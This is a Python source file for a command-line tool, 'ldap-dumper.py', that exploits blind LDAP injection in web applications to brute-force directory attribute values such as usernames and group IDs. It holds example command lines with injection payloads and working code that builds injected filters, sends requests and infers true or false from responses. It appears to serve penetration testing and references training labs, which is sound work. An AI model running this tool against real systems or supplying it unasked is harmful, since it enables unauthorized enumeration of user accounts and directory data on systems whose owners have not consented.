"""
example:
python ldap-dumper.py 'http://vulnerable/ldap/example2.php?name=%s)(name=*))%%00&password=' 'AUTHENTICATED as'

In this example, we inserted an expression into the param that will always
return true if the parameter replaced by %s is true, in this case ennumerating
all valid users. Your mission is to get an LDAP that will return TRUE-STRING
when %s is TRUE, and will not return it when FALSE.

Strings inserted look like 'a*', 'b*', 'c*'

Some LDAP attributes do not support wildcards, in which case you should use --no-wildcard

non-wildcard example:
python ldap-dumper.py -N -a gidNumber -c 'digits' --max-word-size 5 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'

In this example, note how the %s needs to be placed right at the end of an
always-true filter and its respective close parenthesis.

Strings inserted look like
"(|(gidNumber=0)(gidNumber=1)(gidNumber=2)(gidNumber=3)(gidNumber=4))..."
(trimmed for brevity)

NOTE: Remember to quote the URL because bash! And also remember that % needs to
be escaped as %%, because python/printf.

CAVEAT: in wildcard search, if there are two users that begin with the same
string, but one is larger than the other, only the largest one will be
returned. E.g. if both admin and admin2 exist, when bruting in wildcard mode,
only admin2 will be returned.

Plase see for more info:

https://code.google.com/p/ldap-blind-explorer/
https://www.owasp.org/index.php/LDAP_injection
http://web-for-pentester.pentesterlab.com/examples_of_web_vulnerabilities/ldap_attacks/
http://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf
http://www.ietf.org/rfc/rfc1960.txt
"""

import argparse, logging, string, requests, sys, itertools, timeit

class LdapGlobals():
    start_time = timeit.default_timer()
    total_requests = 0

LDAP_GLOBALS = LdapGlobals()

def request_true(url, true_string):
    LDAP_GLOBALS.total_requests += 1
    logging.debug(url)
    response = requests.get(url)
    return true_string in response.text

def brute_char(base_url, charset, true_string, prefix):
    valid = []
    for c in charset:
        inj = "%s%s*" % (prefix, c)
        url = base_url % inj
        if request_true(url, true_string):
            valid.append(c)

    return valid

def brute(base_url, true_string, charset):
    logging.info("Entering wildcard brute mode for URL '%s'." % base_url)
    logging.debug("Going to brute with chars %s" % charset)

    # Check which ones were positive.
    exist = []
    first = True
    while True:
        if first == True:
            first = False
            exist = brute_char(base_url, charset, true_string,  "")
            if exist:
                logging.info("Valid initial values found: %s", exist)
            else :
                err("""No initial values found! True string was never there... Maybe attribute does not support wildcard? see --no-wildcard. Otherwise, URL is non-conformant.""")
        else:
            new_exist = []
            finished = True
            for poss in exist:
                valid_continuations = brute_char(base_url, charset,
                    true_string, poss)

                if valid_continuations:
                    for v in valid_continuations:
                        finished = False
                        new_exist.append(poss + v)
                else:
                    new_exist.append(poss)

            if finished :
                break
            else :
                exist = new_exist

    return exist

def or_generate(charset, space_per_request, attribute_name, max_word_size):
    or_base = "(|%s)"
    or_base_len = len(or_base) - 2

    attr_base = "(%s=%s)"
    real_free = space_per_request - or_base_len
    possibilities = itertools.product(charset, repeat=max_word_size)
    tmp = ""
    for poss in possibilities:
        val = attr_base % (attribute_name, "".join(poss))

        # too large! flush
        if len(tmp) + len(val) > real_free :
            or_clause = or_base % tmp
            tmp = ""
            yield or_clause

        tmp += val

# Goes through each of the or filters, a string sort of like this:
# (|(gidNumber=18880)(gidNumber=18881)(gidNumber=18882)(gidNumber=18883)...)
def or_loop(or_subfilter):
    # substr the (|...)
    final = or_subfilter[2:-1]
    for spl in final.split(")"):
        if spl != "":
            yield spl + ")"

# all parameters are arguments gotten from the command line.
def brute_nowild(base_url, true_string, charset, max_path_size, attribute_name, max_word_size):
    logging.info("Entering non-wildcard mode for URL '%s' (bruteforcing '%s')." % (base_url, attribute_name))
    logging.debug("Going to brute with chars %s up to %s length" % (charset, max_word_size))

    # we are going to do (|(cn="a")(cn="b")[...]) until max_path_size so as to know if any of the
    # possibilities are valid.
    exist = []
    space_per_request = max_path_size - (len(base_url) - 2)
    or_subfilters = or_generate(charset, space_per_request, attribute_name, max_word_size)
    for or_subfilter in or_subfilters:
        url = base_url % or_subfilter
        if request_true(url, true_string):
            looper = or_loop(or_subfilter)
            for filt in looper:
                if request_true(base_url % filt, true_string):
                    found = filt[len(attribute_name)+2:-1]
                    logging.info("Found value %s" % found)
                    exist.append(found)

    return exist

def logging_set(verbosity):
    fmt = "%(levelname)s - %(message)s"
    if verbosity == 0:
        logging.basicConfig(level=logging.WARNING, format=fmt)
    elif verbosity == 1:
        logging.basicConfig(level=logging.INFO, format=fmt)
    else :
        logging.basicConfig(level=logging.DEBUG, format=fmt)

    requests_log = logging.getLogger("requests")
    requests_log.setLevel(logging.WARNING)

def parser_get():
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,description="Bruteforces LDAP!", epilog=__doc__)
    parser.add_argument('URL', help="""The URL that is vulnerable to LDAP
        injection, with a %%s where the injection is.""")
    parser.add_argument('TRUE_STRING', help="""A string that appears in the
        response if LDAP says True. If string doesnt appear, false is assumed.""")

    parser.add_argument("--charset", "-c", help="""The set of characters the
        script will attempt to use while bruteforcing.""",
        choices=['lower_and_digit', 'upperlower_and_digits', 'upperlower_hex', 'digits'],
        default="lower_and_digit")
    parser.add_argument("--verbosity", "-v", type=int, help="0 warn, 1 info, 2 debug", default=1)
    parser.add_argument("--charset-custom", "-C", help="""A custom string that
    contains all the charcters to use. E.g. '-C ABC389'""")

    parser.add_argument('--no-wildcard', '-N', help="""Some LDAP values do not
        honor the wildcard. These need to be bruteforced without a wildcard, which
        is much slower.""", action="store_true")
    parser.add_argument('--max-path-size', help="""For non-wildcard only: for
        bruteforcing DN names, which don't support wildcards, we create massive
        filters like (!(val=value1)(val=value2))[...] to be more efficient. This
        defines how long requests will be.""", default=8100)
    parser.add_argument("--max-word-size", help="""For wildcard only: the max
        max length we are going to attempt to bruteforce.""", type=int, default=6)
    parser.add_argument("--attribute-name", "-a", help="""Required for
        non-wildcard bruteforcing.""")

    return parser

def charset_get(charset_name):
    if charset_name == "lower_and_digit":
        charset = string.ascii_lowercase + string.digits
    elif charset_name == "upperlower_and_digits":
        charset = string.ascii_letters + string.digits
    elif charset_name == "upperlower_hex":
        charset = string.hexdigits
    elif charset_name == "digits":
        charset = string.digits

    return charset

def succ(result):
    total_time = (timeit.default_timer()) - LDAP_GLOBALS.start_time
    time_info = "%ss total time, %s total HTTP requests" % (round(total_time, 3), LDAP_GLOBALS.total_requests)
    if result:
        print("Valid values found (%s):\n" % time_info)
        for r in result:
            print(r)

        sys.exit(1)
    else:
        print("No results found (%s.)")
        sys.exit(1)

def err(message):
    logging.warn(message)
    sys.exit(1)

if __name__ == '__main__':
    parser = parser_get()
    args = parser.parse_args()

    logging_set(args.verbosity)
    logging.debug(args)

    if(args.charset_custom):
        charset = args.charset_custom
    else:
        charset = charset_get(args.charset)

    if not args.no_wildcard:
        valid_values = brute(args.URL, args.TRUE_STRING, charset)
    else :
        if not args.attribute_name :
            err("Attribute name is required for non-wildcard bruteforcing. Please specify it with --attribute-name.")
        valid_values = brute_nowild(args.URL, args.TRUE_STRING, charset, args.max_path_size, args.attribute_name, args.max_word_size)

    succ(valid_values)
